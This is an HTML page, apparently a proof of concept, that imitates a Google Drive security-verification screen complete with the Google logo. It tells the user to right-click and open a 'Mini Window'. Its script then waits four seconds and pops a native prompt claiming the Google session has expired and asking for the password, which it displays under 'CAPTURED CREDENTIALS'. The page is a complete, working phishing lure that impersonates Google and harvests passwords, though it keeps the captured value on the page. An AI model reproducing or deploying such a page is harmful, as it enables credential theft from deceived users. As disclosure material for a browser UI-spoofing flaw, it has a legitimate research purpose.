<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Drive - Security Sync</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
            color: #3c4043;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            padding: 40px;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }

        .logo { width: 64px; margin-bottom: 20px; }
        h1 { font-size: 22px; font-weight: 400; color: #1a73e8; }
        p { font-size: 14px; line-height: 1.6; }

        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: 500;
            display: inline-block;
            margin-top: 20px;
            cursor: pointer;
        }

        #log {
            margin-top: 30px;
            padding: 15px;
            background: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 4px;
            display: none;
            text-align: left;
            font-family: monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="container">
        <svg class="logo" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        <h1>Security Verification Required</h1>
        <p>To verify this app, right-click and select <b>"Open in Mini Window"</b> to start the Google Security Sync.</p>
        
        <a id="trigger" class="btn" href="https://drive.google.com">
            Verify via Google
        </a>

        <div id="log">
            <b style="color:red">⚠️ CAPTURED CREDENTIALS</b><br>
            Password: <span id="capturedPass"></span>
        </div>
    </div>

    <script>
        document.getElementById('trigger').addEventListener('contextmenu', () => {
            console.log("[PoC] Context menu opened. Triggering native prompt in 4s...");
            
            setTimeout(() => {
                // Using a native JavaScript prompt
                // This will appear above the Mini Window in most browser environments
                const pass = prompt("Your Google session has expired. Please re-enter your password to continue syncing Drive:");
                
                if (pass) {
                    console.log("[SUCCESS] Captured data:", pass);
                    document.getElementById('log').style.display = 'block';
                    document.getElementById('capturedPass').textContent = pass;
                }
            }, 4000);
        });
    </script>
</body>
</html>
